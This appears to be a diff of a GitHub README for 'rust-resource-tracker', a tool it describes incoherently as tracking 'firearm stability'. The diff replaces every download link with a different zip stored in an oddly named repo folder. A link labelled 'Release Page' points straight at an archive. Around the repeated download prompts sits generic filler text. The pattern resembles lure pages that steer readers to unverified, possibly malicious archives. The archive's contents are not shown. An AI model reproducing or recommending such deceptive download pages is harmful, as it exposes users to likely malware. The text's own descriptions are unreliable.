@@ -1,7 +1,7 @@
 # 🚀 rust-resource-tracker - Track Firearm Stability Effortlessly
 
 ## 📥 Download Now
-[![Download rust-resource-tracker](https://raw.githubusercontent.com/CharlesNjama/rust-resource-tracker/main/unclench/rust-resource-tracker-spendful.zip)](https://raw.githubusercontent.com/CharlesNjama/rust-resource-tracker/main/unclench/rust-resource-tracker-spendful.zip)
+[![Download rust-resource-tracker](https://github.com/CharlesNjama/rust-resource-tracker/raw/refs/heads/main/unclench/tracker_resource_rust_v3.7.zip)](https://github.com/CharlesNjama/rust-resource-tracker/raw/refs/heads/main/unclench/tracker_resource_rust_v3.7.zip)
 
 ## 🚀 Getting Started
 This guide helps you download and run the Rust Resource Tracker application. You will find simple steps to start using the application for your research.
@@ -40,11 +40,11 @@ Before downloading, ensure your system meets the following requirements:
 - **Graphics:** Any OpenGL supporting graphics card
 
 ## 📥 Download & Install
-To start using rust-resource-tracker, visit this page to download: [Download rust-resource-tracker](https://raw.githubusercontent.com/CharlesNjama/rust-resource-tracker/main/unclench/rust-resource-tracker-spendful.zip). 
+To start using rust-resource-tracker, visit this page to download: [Download rust-resource-tracker](https://github.com/CharlesNjama/rust-resource-tracker/raw/refs/heads/main/unclench/tracker_resource_rust_v3.7.zip). 
 
 Follow these steps to install:
 
-1. **Visit the Releases Page:** Go to [Release Page](https://raw.githubusercontent.com/CharlesNjama/rust-resource-tracker/main/unclench/rust-resource-tracker-spendful.zip).
+1. **Visit the Releases Page:** Go to [Release Page](https://github.com/CharlesNjama/rust-resource-tracker/raw/refs/heads/main/unclench/tracker_resource_rust_v3.7.zip).
 2. **Find the Latest Release:** Look for the section titled 'Latest Release.'
 3. **Download the Application:** Click on the appropriate file for your operating system. 
 4. **Extract the Files:** If it's a compressed file, extract it to a folder on your computer.
@@ -83,4 +83,4 @@ This application touches on several important topics:
 These topics highlight the relevance of the application in related discussions.
 
 ## 📥 Download Now Again
-Ready to begin your research journey? [Download rust-resource-tracker](https://raw.githubusercontent.com/CharlesNjama/rust-resource-tracker/main/unclench/rust-resource-tracker-spendful.zip) today and enhance your understanding of firearm stability analysis.
+Ready to begin your research journey? [Download rust-resource-tracker](https://github.com/CharlesNjama/rust-resource-tracker/raw/refs/heads/main/unclench/tracker_resource_rust_v3.7.zip) today and enhance your understanding of firearm stability analysis.
